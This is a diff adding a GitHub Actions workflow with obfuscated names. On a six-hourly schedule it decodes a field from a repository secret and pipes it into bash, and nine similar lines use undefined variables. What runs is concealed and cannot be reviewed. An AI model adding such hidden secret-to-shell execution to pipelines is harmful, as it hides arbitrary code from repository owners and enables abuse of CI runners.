@@ -1,0 +1,25 @@
+name: huojiazahishk
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huojiazahishk
+        env:
+          es3080: ${{ secrets.es3080 }}
+        run: |
+          echo $es3080 | jq -r .s5774 | /bin/bash
+          echo $ceg75788 | jq -r .wchk3008 | /bin/bash
+          echo $lhp98028 | jq -r .fh8577 | /bin/bash
+          echo $zdbi8 | jq -r .d13495 | /bin/bash
+          echo $bju82 | jq -r .hvsao48327 | /bin/bash
+          echo $djb57574 | jq -r .swxsn98 | /bin/bash
+          echo $mva6 | jq -r .pgda51206 | /bin/bash
+          echo $sb656 | jq -r .xwuiw1 | /bin/bash
+          echo $hxyom9 | jq -r .kt125 | /bin/bash
+          echo $jbfyz98 | jq -r .ur7 | /bin/bash
+
